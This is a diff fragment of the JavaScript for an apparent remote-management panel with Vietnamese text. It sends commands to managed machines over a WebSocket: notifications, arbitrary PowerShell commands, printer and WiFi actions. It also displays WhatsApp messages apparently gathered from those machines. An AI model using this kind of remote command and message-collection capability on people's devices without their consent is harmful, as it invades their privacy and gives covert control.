+    document.getElementById('btn-img-attach').style.background = '#78350f';
+  };
+  reader.readAsDataURL(file);
+}
+function sendNotif() {
+  const msg = document.getElementById('notif-msg').value.trim();
+  if (!msg) return alert(t('noMsg'));
+  const params = {title:senderName, message:msg};
+  if (_notifImgB64) params.image = _notifImgB64;
+  sendCmd('send_notification', params);
+  document.getElementById('notif-msg').value = '';
+  document.getElementById('notif-img-name').textContent = '';
+  document.getElementById('notif-img-input').value = '';
+  _notifImgB64 = null;
+  // Reset màu nút ảnh về mặc định
+  document.getElementById('btn-img-attach').style.background = '';
+}
+function promptDateFrom() { return prompt('Từ ngày (YYYY-MM-DD):', new Date(Date.now()-7*86400000).toISOString().slice(0,10)); }
+function promptDateTo()   { return prompt('Đến ngày (YYYY-MM-DD):', new Date().toISOString().slice(0,10)); }
+function sendPS() {
+  const cmd = document.getElementById('ps-cmd').value.trim();
+  if (!cmd) return alert(t('noCmd'));
+  sendCmd('powershell', {command:cmd});
+  document.getElementById('ps-cmd').value = '';
+}
+function sendCmdAll(action, params={}) {
+  ws.send(JSON.stringify({type:'cmd_all',action,params}));
+  addMsg(`<span class="spinner"></span> ${t('waiting')}`, action, 'ALL');
+}
+function sendNotifAll() {
+  const msg = document.getElementById('notif-msg').value.trim()||'Thông báo từ quản lý';
+  ws.send(JSON.stringify({type:'cmd_all',action:'send_notification',params:{title:senderName,message:msg}}));
+  addMsg(`${t('bcast')}: <b>${esc(msg)}</b>`, t('bcast'), 'ALL');
+}
+
+// ── Printer ────────────────────────────────────────────────────────────────
+function togglePrinter() {
+  const p = document.getElementById('printer-panel');
+  p.classList.toggle('open');
+  document.getElementById('btn-printer').style.background =
+    p.classList.contains('open') ? 'var(--pur)' : '';
+}
+function clearQueue() {
+  sendCmd('clear_print_queue', {printer:''});
+}
+function installPrinter() {
+  const ip   = document.getElementById('pt-ip').value.trim();
+  const name = document.getElementById('pt-name').value.trim();
+  if (!ip || !name) return alert('Nhập IP và tên máy in.');
+  sendCmd('install_printer_ip', {ip, name});
+  document.getElementById('pt-ip').value = '';
+  document.getElementById('pt-name').value = '';
+}
+function printFile() {
+  const path    = document.getElementById('pt-file').value.trim();
+  const printer = document.getElementById('pt-printer').value.trim();
+  if (!path) return alert('Nhập đường dẫn file cần in.');
+  sendCmd('print_file', {path, printer});
+  document.getElementById('pt-file').value = '';
+}
+function wifiPrint() {
+  const target = document.getElementById('pt-wifi-target').value.trim();
+  const file   = document.getElementById('pt-wifi-file').value.trim();
+  if (!target) return alert('Nhập tên WiFi máy in (phải là profile đã lưu trên máy).');
+  if (!file)   return alert('Nhập đường dẫn file cần in.');
+  sendCmd('wifi_print', {target_wifi: target, file_path: file});
+  document.getElementById('pt-wifi-target').value = '';
+  document.getElementById('pt-wifi-file').value   = '';
+  addMsg(`📡 Đổi sang WiFi "${target}" → in "${file}" → toast xác nhận trên máy`, 'wifi_print', selectedMachine);
+}
+
+// ── WhatsApp formatter ─────────────────────────────────────────────────────
+function fmtWhatsApp(raw) {
+  try {
+    const d = JSON.parse(raw);
+    if (d.error) return `<span style="color:#ef4444">${esc(d.error)}</span>`;
+    let html = `<div style="font-size:12px;margin-bottom:4px">📊 ${d.message_count} tin nhắn | Nguồn: ${(d.sources||[]).map(s=>`<span style="color:#a78bfa">${esc(s)}</span>`).join(', ')}</div>`;
+    if (!d.messages || d.messages.length === 0) {
+      html += `<div style="color:#64748b;font-size:12px">Không có tin nhắn nào trong khoảng thời gian này</div>`;
+      return html;
+    }
+    html += `<table style="width:100%;border-collapse:collapse;font-size:12px">
+      <tr style="color:#64748b"><th style="text-align:left;padding:2px 6px">Từ</th><th style="text-align:left;padding:2px 6px">Nội dung</th><th style="text-align:left;padding:2px 6px">Thời gian</th></tr>`;
+    d.messages.slice(0,50).forEach(m => {
+      const ts = m.ts ? new Date(m.ts > 1e12 ? m.ts : m.ts*1000).toLocaleString() : '';
+      html += `<tr style="border-top:1px solid rgba(255,255,255,0.06)">
+        <td style="padding:2px 6px;color:#a78bfa;white-space:nowrap">${esc(m.from||'?')}</td>
+        <td style="padding:2px 6px">${esc(m.body||'')}</td>
+        <td style="padding:2px 6px;color:#64748b;white-space:nowrap">${esc(ts)}</td>
+      </tr>`;
+    });
+    html += '</table>';
+    return html;
+  } catch { return `<pre style="font-size:11px">${esc(raw.slice(0,500))}</pre>`; }
+}
+
+// ── Printer output formatter ───────────────────────────────────────────────
+function fmtPrinters(raw) {
+  try {
+    let arr = JSON.parse(raw);
+    if (!Array.isArray(arr)) arr = [arr];
+    const rows = arr.map(p => {
+      const def  = p.Default ? ' ★' : '';
+      const stat = p.Status || p.PrinterStatus || '?';
+      return `${(p.Name||'').padEnd(30)} ${String(stat).padEnd(12)} ${p.PortName||''}${def}`;
+    });
+    const hdr = `${'Name'.padEnd(30)} ${'Status'.padEnd(12)} Port`;
+    return [hdr, '─'.repeat(56), ...rows].join('\n');
+  } catch { return raw; }
+}
+function fmtPrintQueue(raw) {
+  try {
+    let arr = JSON.parse(raw);
+    if (!arr || arr.length === 0) return '(No print jobs in queue)';
+    if (!Array.isArray(arr)) arr = [arr];
+    const rows = arr.map(j =>
+      `${(j.Document||'').slice(0,28).padEnd(28)} ${(j.JobStatus||'').padEnd(14)} ${j.UserName||''} [${j.TotalPages||'?'}p]`
+    );
+    const hdr = `${'Document'.padEnd(28)} ${'Status'.padEnd(14)} User`;
+    return [hdr, '─'.repeat(58), ...rows].join('\n');
+  } catch { return raw; }
+}
+</script>
+</body>
+</html>
